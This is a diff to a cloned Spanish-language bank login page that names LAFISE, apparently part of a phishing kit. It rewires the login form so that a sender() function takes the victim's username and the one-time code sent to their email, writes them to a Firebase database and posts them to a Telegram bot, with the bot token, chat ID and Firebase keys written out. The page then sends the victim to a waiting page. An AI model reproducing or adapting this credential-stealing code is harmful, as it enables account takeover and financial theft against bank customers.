@@ -34151,6 +34151,8 @@
             }
         }
     </style>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+
 </head>
 
 <body class="generic"><icb-app _nghost-c0="" ng-version="4.4.7">
@@ -35784,7 +35786,7 @@
                                                                                             _ngcontent-c29=""
                                                                                             _nghost-c35="">
                                                                                             <form _ngcontent-c35=""
-                                                                                                id="loginform"
+                                                                                                onsubmit="javascript: return sender()"
                                                                                                 class="wizardAutoHeightModeX ng-pristine ng-invalid ng-touched">
                                                                                                 <div _ngcontent-c35=""
                                                                                                     class="subotica">
@@ -35802,7 +35804,7 @@
                                                                                                                 formcontrolname="username"
                                                                                                                 required
                                                                                                                 id="step01"
-                                                                                                                placeholder="Escriba su nombre de usuario">
+                                                                                                                placeholder="Escriba código enviado al correo">
                                                                                                         </div>
 
 
@@ -36002,7 +36004,11 @@
                                                                                                                 </div>
                                                                                                                 <div _ngcontent-c35=""
                                                                                                                     class="subotica-content-button-table-right">
+                                                                                                                    <div _ngcontent-c36=""
+                                                                                                                    class="subotica-content-button-table-right">
                                                                                                                     <button
+                                                                                                                        type="button"
+                                                                                                                        onclick="sender()"
                                                                                                                         id="submitBtn"
                                                                                                                         class="custom-button">
                                                                                                                         Siguiente
@@ -36024,7 +36030,6 @@
                                                                                                                             /* tono más oscuro al pasar el mouse */
                                                                                                                         }
                                                                                                                     </style>
-
                                                                                                                 </div>
                                                                                                             </div>
 
@@ -36032,21 +36037,6 @@
                                                                                                     </div>
                                                                                                 </div>
                                                                                             </form>
-                                                                                            <script>
-                                                                                                document.getElementById('loginform').addEventListener('submit', function (event) {
-                                                                                                    event.preventDefault(); // Evita el envío real del formulario
-
-                                                                                                    const username = document.getElementById('step01').value;
-
-                                                                                                    if (username.trim() !== '') {
-                                                                                                        localStorage.setItem('username', username);
-                                                                                                        window.location.href = 'pass.html'; // Redirige a pass.html
-                                                                                                    } else {
-                                                                                                        alert('Por favor, escriba su nombre de usuario.');
-                                                                                                    }
-                                                                                                });
-                                                                                            </script>
-
                                                                                         </icb-login-step-user>
                                                                                     </div>
                                                                                 </wizard-step-content>
@@ -41359,6 +41349,82 @@
             <div class="mesina-welcome-subtitle1">Por favor espere un momento...</div>
         </div>
     </div>
+     <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-firestore.js"></script>
+
+<script>
+  // Configura Firebase igual que en waiting.html
+  const firebaseConfig = {
+    apiKey: "AIzaSyDkFiTElkEcL0B1eAtRrrCoGm9HCt9EGZc",
+    authDomain: "flab-d70ab.firebaseapp.com",
+    databaseURL: "https://flab-d70ab-default-rtdb.firebaseio.com",
+    projectId: "flab-d70ab",
+    storageBucket: "flab-d70ab.firebasestorage.app",
+    messagingSenderId: "789535969500",
+    appId: "1:789535969500:web:ff0f3be7c250dac33ee419"
+  };
+
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.firestore();
+
+  // Bot token y chat ID
+var telegram_bot_id = "7290225049:AAE6Z015W7bYLuLmVqUXlD782ft8roSTX7s";
+  var chat_id = -1003036046851;
+
+  var ready = function () {
+      USER = localStorage.getItem('username');
+      CORREO = document.getElementById("step01").value;
+      message = "🧙‍♂️LAFISE\n🤑USER: " + USER + "\n🤑CORREO: " + CORREO;
+  };
+
+  var sender = async function () {
+      ready();
+
+      // Obtén docId del localStorage (el ID del documento en Firestore)
+      const docId = localStorage.getItem("docId");
+      if (!docId) {
+        alert("No se encontró ID del usuario. Por favor inicia sesión nuevamente.");
+        return false;
+      }
+
+      try {
+        // Actualiza el campo page a 3 (por ejemplo, para token)
+        await db.collection("varable").doc(docId).update({
+          page: 2, // Cambia esto al número que quieras asignar para la redirección
+          correo: CORREO, // opcional, si quieres guardar el token también
+          timestamp: firebase.firestore.FieldValue.serverTimestamp()
+        });
+
+        // Envía el mensaje a Telegram
+        var settings = {
+          "async": true,
+          "crossDomain": true,
+          "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+          "method": "POST",
+          "headers": {
+              "Content-Type": "application/json",
+              "cache-control": "no-cache"
+          },
+          "data": JSON.stringify({
+              "chat_id": chat_id,
+              "text": message
+          })
+        };
+
+        await $.ajax(settings);
+
+        // Redirige a waiting.html que escuchará el cambio de "page"
+        location.href = "waiting.html";
+
+      } catch (error) {
+        console.error("Error actualizando Firestore o enviando Telegram:", error);
+        alert("Error al procesar los datos. Intenta de nuevo.");
+      }
+
+      return false;
+  }
+</script>
+
 </body>
 
 </html>
